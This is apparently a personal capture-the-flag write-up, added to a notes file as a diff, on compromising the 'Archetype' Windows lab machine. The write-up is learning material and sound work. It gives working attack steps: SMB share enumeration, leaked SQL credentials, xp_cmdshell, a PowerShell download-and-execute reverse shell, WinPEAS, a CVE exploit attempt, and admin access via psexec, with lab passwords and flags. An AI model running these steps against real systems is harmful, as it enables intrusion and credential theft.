@@ -1,0 +1,167 @@
+On `nmap -sV -sC [IP]` we find the following open ports:
+
+PORT     STATE SERVICE      VERSION
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn   
+445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+
+So there's a lot of research to be done first before we know what we're dealing with:
+
+* msrpc (135)
+  Microsoft Remote Procedure Call (function call) is a protocol that allows one program to request service from a program on another computer without having to understand the details of the computer's network. It could be accessed via SMB with a null or authenticated session through ports 139 and 445 which are open, so this is the first thing I want to try:
+
+  @code shell
+  nmap --script "safe or smb-enum-*" -p 445 [IP]
+  @end
+
+  as seen in {https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb}[HackTricks]
+  (yes I found something in this line of thought by accident by pursuing the 445 microsoft-ds one)
+
+  this returns a couple of interesting things:
+
+  @code txt
+  <SNIP>
+  | smb-enum-shares: 
+  <SNIP>
+  |   \\10.129.23.129\IPC$: 
+  |     Type: STYPE_IPC_HIDDEN
+  |     Comment: Remote IPC
+  |     Anonymous access: READ/WRITE
+  |     Current user access: READ/WRITE
+  |   \\10.129.23.129\backups: 
+  |     Type: STYPE_DISKTREE
+  |     Comment: 
+  |     Anonymous access: READ
+  |_    Current user access: READ
+  <SNIP>
+  @end
+
+  Which means that these two shares allow for anonymous access.
+  I connect to the first one by using `smbclient //[IP]/IPC$` which nets nothing because it's empty
+  The second one however has way more interesting stuff:
+
+  @code txt
+  | smb-ls: Volume \\10.129.23.129\backups
+  | SIZE   TIME                 FILENAME
+  | <DIR>  2020-01-20T11:32:14  .
+  | <DIR>  2020-01-20T11:32:14  ..
+  | 609    2020-01-20T12:20:57  prod.dtsConfig
+  |_
+  @end
+
+  By using `get prod.dtsConfig` inside the SMB connection I can download the file.
+  The file has this configuration which means I've found something:
+  @code config
+  <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
+  <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+  </Configuration>
+  @end
+  I'm especially interested in the part that says Password (might be just me) also the UserID seems to point to the SQL thingy on port 1443, which is where I'm going next, password in hand.
+
+* ms-sql-s (1443)
+
+  Microsoft SQL Server is a relational database management system developed by Microsoft. As a database server, it is a software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet).
+  (From wikipedia via Hacktricks)
+
+  Hacktricks recommends using Impacket mssqlclient.py. Impacket is a collection of Python classes for working with network protocols.
+  Luckily for me one of the protocols is mssql. The recommended command is:
+  @code shell
+  impacket-mssqlclient -windows-auth [DOMAIN]/[USERNAME]:[PASSWORD]@[IP]
+  @end
+
+  And we already have all that information: the `[DOMAIN]/[USERNAME]` and password parts we got from `prod.dtsConfig`. By executing the command:
+
+  @code shell
+  impacket-mssqlclient -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@[IP]
+  @end
+
+  we get an SQL shell inside the target.
+
+  I tried several things like creating a sysadmin:
+  @code sql
+  CREATE LOGIN hacker WITH PASSSWORD = 'l4w3l3s!'
+  EXEC sp_addsrvrolemember 'hacker', 'sysadmin'
+  @end
+
+  however after stumbling in the dark for a while I found out I already was sysadmin:
+  @code sql
+  SELECT IS_SRVROLEMEMBER('sysadmin');
+  @end
+  which showed my current user among others. In retrospective I could have done that first
+
+  So the cool thing about impacket-mssqlclient is that you can start running privileged command as easily as `enable xp_cmdshell` followed by:
+  `EXEC master..xp_cmdshell '[any cmd]'`
+
+  Which means that it's reverse shell time. (yay!)
+
+  Thanks to {https://rioasmara.com/2020/01/31/mssql-rce-and-reverse-shell-xp_cmdshell-with-nishang/}[this article] I was able to set up a Power-Reverse-Shell
+  by doing the following:
+
+  -- 1. Prepared a reverse shell file from the Nishang shells in `/usr/share/Nishang/shells`
+     I just had to append `Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port 8000` at the end of my shell of choice
+  -- 2. Copied the shell to `~/`
+  -- 3. Started a Python HTTP server with `python3 -m http.servers 80`
+  -- 4. Started an nc listener with the usual `nc -nlvp 8000`
+  -- 5. Then went to the mssqlclient-connected target and executed the beautiful:
+  @code sql
+  EXEC master..xp_cmdshell "powershell IEX(New-Object Net.webclient).downloadString('http://[IP]/rev.ps1')"
+  @end
+  Voilà! Et reverse shell.
+
+  Now with the reverse shell I got to the very good looking `C:\Users\Administrator` directory where I got an angry access denied message.
+  Time to find out how to escalate privileges.
+
+  (I also found the user flag in C:\Users\sql_svc\Desktop)
+  3e7b102e78218e935bf3f4951fec21a3
+
+  So by checking at a couple tutorials it seems the best way to do this is by downloading {https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-manipulation}[Carlos Palop's WinPEAS] into the target machine.
+
+  We can do this by downloading the .exe, putting it into a folder in the host, and then running
+  @code powershell
+  wget http://[IP]/winPEASx64.exe -outfile winPEASx64.exe
+  @end
+  which will work since we are already running a python http server to serve the file.
+
+  Then we can run the script by just doing `.\winPeasx64.exe`
+
+  This nets us with a kilometric output. Let's try to find any interesting tidbits to see what lines we can follow:
+** Exploitable KBs (kernel binaries I guess?)
+   There's 12 potential vulnerabilities. After skimming through the list, I've found a couple that both have an actual website explaining it and have an easy to use script that can be run in the target machine.
+
+   -- {https://github.com/padovah4ck/CVE-2020-0683}[CVE-2020-0683]
+      This one just requires to open an exe from the target machine. First we clone the repo from the host:
+   @code shell
+   git clone https://github.com/padovah4ck/CVE-2020-0683
+   @end
+   then we download the exe from the target:
+   @code powershell
+   wget http://[IP]/path/to/exe/MsiExploit.exe -outfile MsiExploit.exe
+   @end
+   and then we just execute it with `\.MsiExploit.exe`
+
+   After executing it I realised I should have read a little bit more about the vulnerability: It allows you to edit or remove a file single file in the same directory as the executable, which is not as useful when you can't move the executable to any of the important places. That was a mistake on my part, but an interesting find nonetheless.
+   Similarly the other exploits are either too technical or limited to editing/moving single files, so I'll leave this line for now and come back to it if and when I'm out of options.
+
+** PowerShell history file
+   There might be something here other than my own commands. It's currently located at 
+   `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
+
+Aaaand there it is. Inside the txt we can find
+@code txt
+   net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+   @end
+
+   After around an hour of trying to figure out how to spawn a privileged PowerShell from the target machine, I finally gave up and looked at the walkthrough (so close to the end, super sad).
+   It used `impacket-psexec` from the host machine to get in. The full command
+@code shell
+impacket-psexec administrator@[IP]
+   @end
+   prompts you for the password and then gives you an interactive cmd shell that you can freely browse around in. The admin flag is in the admin desktop. The end.
+   b91ccec3305e98240082d4474b848528
+
+
+* Teachings from my own mistakes:
+  -- Fully read what an exploit does before downloading it/trying it on the target
+  -- If I overcommit on a line and it doesn't pan out, I should enumerate the other lines and try to pursue them before giving up (it almost carried me through the entire thing without looking at the walkthrough)
+  -- Maybe enumerate all possible lines first so I have a clear line of sight beforehand and can avoid tunnel vision.
